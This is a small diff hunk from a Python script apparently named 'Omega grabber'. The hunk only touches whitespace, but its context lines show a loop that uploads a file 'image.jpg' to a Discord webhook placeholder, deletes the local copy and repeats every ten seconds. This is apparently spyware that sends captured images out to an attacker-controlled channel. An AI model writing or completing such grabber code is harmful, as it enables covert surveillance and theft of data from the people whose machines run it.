@@ -148,4 +148,4 @@ while True:
     r =requests.post("DISCORDURL",json={'username': 'Omega grabber'}, files = {'file': open('image.jpg', 'rb')})
     
     os.remove('image.jpg')
-    time.sleep(10)
+    time.sleep(10) 
